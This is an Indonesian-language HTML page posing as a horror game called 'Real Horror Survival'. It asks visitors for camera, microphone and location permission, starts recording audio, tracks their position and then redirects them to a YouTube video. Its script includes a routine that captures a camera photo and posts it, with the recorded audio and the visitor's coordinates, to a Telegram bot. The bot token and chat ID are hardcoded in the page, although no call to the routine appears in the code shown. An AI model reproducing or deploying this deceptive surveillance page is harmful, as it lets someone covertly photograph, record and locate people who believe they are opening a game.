<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real Horror Survival</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #0c0c0c;
            color: #f0f0f0;
            text-align: center;
            overflow: hidden;
            height: 100vh;
            margin: 0;
        }
        h1 {
            margin-top: 20px;
            font-size: 2.5em;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.7);
        }
        button {
            margin-top: 20px;
        }
        #loading {
            display: none;
            font-size: 1.5em;
            margin-top: 20px;
        }
        #cameraContainer {
            display: none;
            position: relative;
            width: 100%;
            height: 100%;
            margin: 0 auto;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border: 2px solid #e63946;
        }
        .mic-icon {
            font-size: 2em;
            color: red;
            display: none;
            position: absolute;
            bottom: 10px;
            left: 10px;
        }
        .location {
            margin-top: 20px;
            font-size: 1.2em;
            color: white;
        }
        #permissionContainer {
            display: block;
        }
        #countdown {
            font-size: 3em;
            color: red;
            margin-top: 20px;
        }
        #countdownContainer {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Selamat datang di Real Horror Survival!</h1>
        <p>Untuk memulai permainan, Anda harus memberikan izin kepada situs ini untuk mengakses kamera, mikrofon, dan lokasi Anda.</p>
        
        <div id="permissionContainer">
            <button class="btn btn-danger btn-lg" onclick="requestPermissions()">Izinkan dan Mulai</button>
        </div>

        <div id="loading">Loading... Persiapkan diri Anda, permainan dimulai segera!</div>

        <div id="cameraContainer">
            <video id="video" autoplay></video>
            <div class="mic-icon" id="micIcon">ðŸŽ¤</div>
            <div class="location" id="locationDisplay"></div>
        </div>

        <div id="countdownContainer">
            <div id="countdown">10</div>
        </div>
    </div>

    <script>
        let videoStream;
        let mediaRecorder;
        let audioChunks = [];
        let locationData = {};
        let countdownValue = 10;
        let countdownInterval;
        let botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8"; // Token bot Telegram kamu
        let chatId = "6010073048"; // ID pengguna Telegram kamu

        async function requestPermissions() {
            // Tampilkan pesan loading setelah izin diberikan
            document.getElementById("loading").style.display = "block";
            document.getElementById("permissionContainer").style.display = "none";

            // Minta izin untuk akses kamera dan mikrofon
            try {
                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById("loading").style.display = "none";
                document.getElementById("cameraContainer").style.display = "block";
                document.getElementById("video").srcObject = videoStream;

                // Mulai rekam suara
                mediaRecorder = new MediaRecorder(videoStream);
                mediaRecorder.onstart = () => {
                    document.getElementById("micIcon").style.display = "block";
                    setInterval(() => {
                        document.getElementById("micIcon").style.opacity = document.getElementById("micIcon").style.opacity === "1" ? "0.5" : "1";
                    }, 500);
                };
                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };
                mediaRecorder.start();

                // Dapatkan lokasi
                navigator.geolocation.watchPosition(position => {
                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    document.getElementById("locationDisplay").innerText = `Lokasi Anda: ${locationData.latitude}, ${locationData.longitude}`;
                });

                // Tampilkan countdown setelah izin diberikan
                startCountdown();

            } catch (error) {
                console.error("Akses ditolak atau terjadi kesalahan:", error);
                alert("Akses ditolak. Anda tidak bisa melanjutkan permainan.");
            }
        }

        function startCountdown() {
            document.getElementById("countdownContainer").style.display = "block";
            countdownInterval = setInterval(() => {
                document.getElementById("countdown").textContent = countdownValue;
                countdownValue--;

                if (countdownValue < 0) {
                    clearInterval(countdownInterval);
                    // Arahkan pengguna ke video YouTube
                    window.location.href = "https://youtu.be/xvFZjo5PgG0?si=SXv6a7xY6dLFV2ml";
                }
            }, 1000);
        }

        function captureAndSend() {
            // Ambil foto
            const video = document.getElementById("video");
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL("image/png");

            // Kirim foto, suara, dan lokasi ke Telegram
            sendToTelegram([photoData]);
        }

        function sendToTelegram(photos) {
            // Konversi foto menjadi Blob
            let photoBlobs = photos.map(photoData => dataURItoBlob(photoData));

            const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
            const formData = new FormData();
            formData.append("chat_id", chatId);

            // Kirim foto
            photoBlobs.forEach((blob, index) => {
                formData.append("photo", blob, `photo${index + 1}.png`);
            });

            // Kirim audio
            formData.append("audio", audioBlob, "audio.webm");

            // Kirim lokasi
            formData.append("latitude", locationData.latitude);
            formData.append("longitude", locationData.longitude);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            }).then(response => {
                console.log("Data terkirim ke Telegram.");
            }).catch(err => {
                console.error("Gagal mengirim data ke Telegram:", err);
            });
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: 'image/png' });
        }
    </script>
</body>
</html>
